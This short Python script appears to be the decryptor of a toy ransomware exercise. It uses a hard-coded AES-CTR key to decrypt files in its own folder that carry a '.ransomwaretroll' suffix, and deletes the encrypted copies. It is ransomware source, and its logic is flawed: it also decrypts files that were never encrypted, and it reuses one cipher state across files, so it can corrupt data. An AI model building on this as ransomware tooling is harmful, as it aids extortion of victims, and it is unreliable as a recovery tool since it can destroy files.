import os
import pyaes
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

diretorio = os.path.dirname(os.path.abspath(__file__))
nomes_arquivos = []

try:
    for nome_arquivo in os.listdir(diretorio):
        if os.path.isfile(os.path.join(diretorio, nome_arquivo)) and not ".py" in nome_arquivo:
            nomes_arquivos.append(nome_arquivo)
    for nome_arquivo in nomes_arquivos:
        file_name = nome_arquivo
        file = open(file_name, "rb")
        file_data = file.read()
        file.close()     
        decrypt_data = aes.decrypt(file_data)
        os.remove(file_name)
        new_file = file_name.replace(".ransomwaretroll", "")
        new_file = open(f'{new_file}','wb')
        new_file.write(decrypt_data)
        new_file.close()

except OSError as e:
    print(f"Ocorreu um erro ao acessar o diretório: {e}")